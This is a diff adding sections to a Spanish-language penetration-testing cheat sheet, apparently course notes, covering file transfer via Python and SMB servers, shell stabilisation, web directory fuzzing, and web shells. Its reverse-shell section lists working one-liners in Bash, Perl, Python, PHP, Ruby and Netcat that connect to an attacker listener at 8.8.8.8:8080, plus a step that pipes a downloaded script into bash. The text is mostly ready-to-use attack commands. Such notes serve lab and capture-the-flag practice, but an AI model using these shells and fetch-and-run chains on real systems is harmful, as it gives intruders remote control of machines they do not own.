@@ -1,5 +1,115 @@
+H A C K I N G   H Y P E:
+██ 20% ... 
+███ 40% .... 
+████ 60% ..... 
+█████ 80% ......
+██████ 100% ....... COMPLETED
 
-   
+W E L C O M E
+
+   |\_._/|        |,\__/|        |\__/,|        |\_._/|
+   | o o |        |  o o|        |o o  |        | 0 0 |
+   (  T  )        (   T )        ( T   )        (  T  )
+  .^`-^-'^.      .^`--^'^.      .^`^--'^.      .^`-^-'^.
+  `.  ;  .'      `.  ;  .'      `.  ;  .'      `.  ;  .'
+  | | | | |      | | | | |      | | | | |      | | | | |
+ ((_((|))_))    ((_((|))_))    ((_((|))_))    ((_((|))_))
+
+
+
+TRANSFERENCIA DE ARCHIVOS  
+.........................
+
+sudo python -m http.server 80
+sudo python -m SimpleHTTPServer 80
+    Para conectarse: via web o si la maquina es windows: powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+    O tambien... Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+sudo python smbserver.py [como se llamara el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/user
+    Para conectarse: copy \\IP\recurso
+
+mas en.... FileTransfer-Win-Lin-Guide.pdf
+
+
+TRATAMIENTO TTY
+...............
+script /dev/null -c bash
+ctrl+z
+stty raw-echo
+fg
+reset
+xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 52 columns 187
+
+mas en.... tratamiento_tty.pdf
+
+
+FUZZING WEB
+...........
+
+wfuzz -c -t 400 --hc=404 -w [wordlist] [url]/FUZZ
+wfuzz -c -t 400 --hc=404 -w [wordlist] -w [archivo_extensiones] [url]/FUZZ.FUZ2Z
+wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar numeros del 0 al 100
+
+nmap --script http-enum -p [PUERTO] [IP]
+
+gobuster dir --url http://IP --wordlist /usr/share/wordlists/dirb/big.txt
+
+dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
+
+Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:
+    dirb http://[IP]/ -u user:password
+
+
+REVERSE SHELL
+.............
+
+https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
+https://deephacking.tech/reverse-shells-en-windows/
+
+si no funciona....
+    1.creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
+    2.compartimos ese archivo mediante python -m....
+    3.lo ejecutamos /usr/bin/curl IP/ARCHIVO|bash
+
+mas en... ShellsInversasCheatSheet.txt
+
+Los siguientes ejemplos suponen que la IP del atacante es 8.8.8.8 y utiliza el puerto 8080 para la conexión.
+Por lo tanto, en todos estos casos, debe escuchar el puerto 8080 con el siguiente comando:
+nc -vv -l -p 8080
+Más info en los videos 26 y 27 del curso.
+
+
+// Bash
+bash -i >& /dev/tcp/8.8.8.8/8080 0>&1
+
+// Perl
+perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+// Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+// PHP
+php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+// Ruby
+ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+// Netcat
+nc -e /bin/sh 8.8.8.8 8080
+
+
+WEB SHELL
+.........
+Para llamar a la webshell --> http://[IP]/webshell.php?cmd=ls
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+https://book.hacktricks.xyz/shells/shells/msfvenom
+https://github.com/frizb/MSF-Venom-Cheatsheet
+    
+
+
 COMMON PORTS
 ............
 
@@ -174,7 +284,7 @@ Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o a
 Listar reglas de AppLocker → "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
 
 
-LINUX TRICK /var/www/html
+LINUX TRICKS /var/www/html
 ...........................
 
 Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
@@ -205,3 +315,4 @@ DESCARGA DE ARCHIVOS POR COMANDO
 
 Linux --> wget [URL]
 Windows --> powershell -c "Invoke-WebRequest -Uri '[URL]'" -OutFile archivo
+
